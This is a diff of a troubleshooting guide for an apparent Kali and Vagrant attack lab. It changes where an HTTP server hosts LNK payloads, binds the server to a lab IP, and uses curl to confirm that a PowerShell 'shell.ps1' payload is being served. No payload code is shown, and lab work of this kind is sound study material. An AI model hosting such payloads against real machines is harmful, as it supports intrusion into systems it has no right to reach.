@@ -275,11 +275,11 @@ This means network is OK, but HTTP server issue:
 **Check HTTP server on Kali:**
 ```bash
 # On Kali - check HTTP server
-cd /vagrant/exploits/lnk
-python3 -m http.server 8080
+cd /home/vagrant/lnk_payloads
+python3 -m http.server 8080 --bind 192.168.56.101
 
 # Verify it's serving the payload
-curl http://localhost:8080/shell.ps1
+curl http://192.168.56.101:8080/shell.ps1
 ```
 
 ---
@@ -355,7 +355,7 @@ if nc -zv 127.0.0.1 8080 2>&1 | grep -q succeeded; then
     echo "  ✓ HTTP server is running on port 8080"
 else
     echo "  ✗ HTTP server is NOT running"
-    echo "  Start: cd /vagrant/exploits/lnk && python3 -m http.server 8080"
+    echo "  Start: cd /home/vagrant/lnk_payloads && python3 -m http.server 8080 --bind 192.168.56.101"
     exit 1
 fi
 
